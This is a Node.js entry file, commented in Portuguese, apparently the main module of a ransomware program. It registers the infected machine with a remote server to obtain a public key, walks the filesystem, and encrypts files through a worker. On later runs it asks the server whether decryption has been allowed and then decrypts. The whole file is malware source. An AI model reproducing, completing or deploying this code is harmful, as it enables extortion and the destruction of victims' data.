"use strict";

const Connection = require("./connection");
const MachineManager = require("./utils/MachineManager");
const Encrypter = require("./crypto/crypter");
const Decrypter = require("./crypto/decrypter");
const FileWalker = require("./discover");
const worker = require("./worker");

//instancia do modulos
const connection = new Connection();

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const waitThenDo = async () => {
    console.log("Esperando...");
    await sleep(1000 * 8);    // 8 segundos
    console.log("Voltando!");
}

// função principal

async function main() {
    var system = MachineManager.loadId();
    if (!system){   // verificação do info.dat da maq (MachineManager) //BP
    // roda o crypter 
        try {
            console.log("Iniciando...");
            system = MachineManager.genereteId();   //BP
            const { publicKey } = await connection.registerMachine(system);
            const fileEncrypter = Encrypter(publicKey);     //BP
            
            FileWalker(filename => {        // executa busca dos arquivos 
                worker(filename, fileEncrypter);
            });
        } catch (error) {
             // server offline
            MachineManager.deleteId();      //BP
        }
    } else {
        // ja rodou na maquina (decript)
        try {
            console.log("desencriptando...");
            const data = await connection.checkMachineStatus(system.uuid);      //BP
            if (data){
                const fileDecrypter = Decrypter(data);
                FileWalker(filename => {
                    worker(filename, fileDecrypter);
                })
            }
        } catch (error) {
            // server offline
            console.log("Erro ao decriptar");       //BP
        }
    }
    // fim do process
}

(async function(){  //self invoking function
    while(true){
        // executa 1º o main e depois espera
        await main();
        await waitThenDo();
    }
});


//-12-13-14